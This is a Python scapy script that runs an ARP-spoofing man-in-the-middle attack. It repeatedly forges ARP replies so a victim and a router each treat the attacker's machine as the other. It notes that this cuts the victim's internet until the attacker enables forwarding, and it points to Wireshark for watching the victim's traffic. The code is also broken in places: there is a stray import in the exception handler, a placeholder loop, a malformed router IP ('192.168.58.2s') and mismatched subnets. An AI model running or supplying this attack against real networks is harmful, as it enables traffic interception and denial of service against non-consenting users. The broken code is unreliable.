# N.B. Once this Python script is launched, the victim's internet connection will no longer work.
# To restore the victim's internet connection, the attacker must run the following commands on their own terminal:
#
#   sudo iptables -P FORWARD ACCEPT
#   sudo sysctl -w net.ipv4.ip_forward=1
#
# After that, the internet connection for the victim will be restored.
# In Wireshark, to monitor traffic from the victim: ip.src == 192.168.58.129


from scapy.all import ARP, send
import time

# Function to send ARP spoofing packets to the victim
def vittima_spoof(victim_ip, victim_mac, fake_mac, fake_ip):
    # Create a forged ARP reply packet
    arp_reply = ARP()
    arp_reply.op = 2  # Operation type 2 means 'ARP reply' (is-at)
    arp_reply.pdst = victim_ip       # Target IP (the victim's IP address)
    arp_reply.hwdst = victim_mac     # Target MAC (the victim's MAC address)
    arp_reply.hwsrc = fake_mac       # Source MAC (attacker's MAC, pretending to be the router)
    arp_reply.psrc = fake_ip         # Source IP (spoofed IP, the router's IP)
    # Send the packet to the victim (silent mode)
    send(arp_reply, verbose=False)

# Function to send ARP spoofing packets to the router
def router_spoof(router_ip, router_mac, fake_mac, fake_ip):
    # Create a forged ARP reply packet
    arp_reply = ARP()
    arp_reply.op = 2  # Operation type 2 means 'ARP reply'
    arp_reply.pdst = router_ip       # Target IP (the router's IP address)
    arp_reply.hwdst = router_mac     # Target MAC (the router's MAC address)
    arp_reply.hwsrc = fake_mac       # Source MAC (attacker's MAC, pretending to be the victim)
    arp_reply.psrc = fake_ip         # Source IP (spoofed IP, the victim's IP)
    # Send the packet to the router (silent mode)
    send(arp_reply, verbose=False)

# Check if the script is being executed directly (not imported as a module)
if __name__ == "__main__":
    # Define IP and MAC addresses (can be parameterized for flexibility)
    victim_ip = "192.168.13.130"          # Victim's IP address
    victim_mac = "00:0c:29:1d:d8:2a"       # Victim's MAC address
    router_ip = "192.168.58.2"            # Router's IP address
    router_mac = "00:50:56:ef:fd:a5"      # Router's MAC address
    attacker_mac = "00:0c:29:f9:24:ec "    # Attacker's MAC address

    try:
        # Infinite loop to continuously send ARP spoof packets
        while True:
            # Spoof the victim to believe the attacker is the router
            vittima_spoof(victim_ip, victim_mac, attacker_mac, router_ip)
            # Spoof the router to believe the attacker is the victim
            router_spoof(router_ip, router_mac, attacker_mac, victim_ip)
            # Wait for 2 seconds before sending the next set of spoofed packets
            time.sleep(2)
    except KeyboardInterrupt:
        # Graceful exit when the user presses Ctrl+C
        # Import required functions from Scapy
      from scapy.all import ARP, send

# Function to restore ARP tables (used as a post-spoofing mitigation)
def leaving_quietly():
    # --- Restore the router's ARP table ---
    # We create an ARP packet to send the correct mapping to the router's ARP cache
    arp_response = ARP()
    
    # Set ARP operation type: 2 means 'ARP reply'
    arp_response.op = 2
    
    # Set the IP address of the router as the target
    arp_response.pdst = "192.168.58.2"  # Router's IP address
    
    # Set the MAC address of the router as the target hardware address
    arp_response.hwdst = "00:50:56:ef:fd:a5"  # Router's MAC address
    
    # Set the real MAC address of the victim (so the router learns the correct binding)
    arp_response.hwsrc = "00:0c:29:1d:d8:2a"  # Victim's MAC address
    
    # Set the victim's IP address as the source IP
    arp_response.psrc = "192.168.13.130"  # Victim's IP address
    
    # Send the ARP packet to the router to fix its ARP table
    send(arp_response)

    # --- Restore the victim's ARP table (typically Windows) ---
    # Create another ARP reply to inform the victim of the correct router MAC
    arp_response = ARP()
    
    # Again, set operation type to ARP reply
    arp_response.op = 2
    
    # Set the victim's IP address as the destination
    arp_response.pdst = "192.168.13.130"  # Victim's IP address
    
    # Set the victim's MAC address as the destination hardware
    arp_response.hwdst = "00:0c:29:1d:d8:2a"  # Victim's MAC address
    
    # Set the real MAC address of the router (to reestablish trust)
    arp_response.hwsrc = "00:50:56:ef:fd:a5"  # Router's MAC address
    
    # Set the router's IP address as the source IP
    arp_response.psrc = "192.168.58.2s"  # Router's IP address
    
    # Send the ARP packet to the victim to fix its ARP table
    send(arp_response)

# If the script is interrupted manually (e.g., with Ctrl+C), handle it gracefully
try:
    # Simulate the main program execution (e.g., ARP spoofing or MITM logic)
    while True:
        # This is where the attack logic would go (e.g., sending spoof packets)
        pass  # Placeholder for the active attack code
except KeyboardInterrupt as err:
    # When a keyboard interrupt occurs, restore the ARP tables
    leaving_quietly()
    print("Exiting... ARP tables have been restored.")
    print("Exiting the script")